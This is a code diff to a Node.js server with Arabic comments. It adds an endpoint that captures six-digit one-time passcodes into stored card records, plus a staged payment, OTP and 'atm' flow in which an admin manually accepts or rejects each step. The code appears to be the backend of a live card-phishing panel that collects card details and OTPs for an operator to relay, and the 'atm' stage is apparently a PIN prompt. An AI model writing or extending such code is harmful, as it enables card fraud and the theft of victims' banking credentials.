@@ -152,7 +152,7 @@ const server = http.createServer(async (req, res) => {
   if (pathname === '/api/payment' && req.method === 'POST') {
     const body = await readBody(req);
     const id = String(body.requestId || '').slice(0, 100) || crypto.randomBytes(8).toString('hex');
-    paymentStates.set(id, { status: 'pending', createdAt: Date.now() });
+    paymentStates.set(id, { status: 'pending', stage: 'payment', createdAt: Date.now() });
     const orders = readOrders();
     const order = orders.find((item) => item.id === id);
     if (order) {
@@ -168,11 +168,37 @@ const server = http.createServer(async (req, res) => {
     return json(res, 200, { ok: true, id: id });
   }
 
+  // استقبال رمز OTP وبدء انتظار قرار الأدمن
+  if (pathname === '/api/otp' && req.method === 'POST') {
+    const body = await readBody(req);
+    const id = String(body.id || '').slice(0, 100);
+    const otp = String(body.otp || '').slice(0, 12);
+    if (!id || !/^\d{6}$/.test(otp)) {
+      return json(res, 400, { ok: false, error: 'invalid-otp' });
+    }
+
+    paymentStates.set(id, { status: 'pending', stage: 'otp', otpSubmitted: true, createdAt: Date.now() });
+    const orders = readOrders();
+    const order = orders.find((item) => item.id === id);
+    if (order) {
+      order.status = 'pending';
+      order.card = order.card || {};
+      order.card.otp = otp;
+      writeOrders(orders);
+    }
+    return json(res, 200, { ok: true, id: id });
+  }
+
   // حالة الدفع التي تنتظر قرار الأدمن
   if (pathname.startsWith('/api/status/') && req.method === 'GET') {
     const id = pathname.split('/').pop();
     const payment = paymentStates.get(id);
-    return json(res, 200, { ok: true, status: payment ? payment.status : 'pending' });
+    return json(res, 200, {
+      ok: true,
+      status: payment ? payment.status : 'pending',
+      stage: payment ? payment.stage : 'payment',
+      otpSubmitted: Boolean(payment && payment.otpSubmitted)
+    });
   }
 
   // قرار الأدمن على بيانات البطاقة
@@ -182,7 +208,16 @@ const server = http.createServer(async (req, res) => {
     const body = await readBody(req);
     const status = body.decision === 'accept' ? 'accept' : body.decision === 'reject' ? 'reject' : '';
     if (!status) return json(res, 400, { ok: false, error: 'invalid-decision' });
-    paymentStates.set(id, { status: status, createdAt: Date.now() });
+    const current = paymentStates.get(id) || {};
+    let stage = current.stage || 'payment';
+    if (stage === 'otp') stage = status === 'accept' ? 'atm' : 'otp';
+    else if (stage === 'atm') stage = status === 'accept' ? 'success' : 'atm';
+    paymentStates.set(id, {
+      status: status,
+      stage: stage,
+      otpSubmitted: Boolean(current.otpSubmitted),
+      createdAt: Date.now()
+    });
     const orders = readOrders();
     const order = orders.find((item) => item.id === id);
     if (order) { order.status = status; writeOrders(orders); }
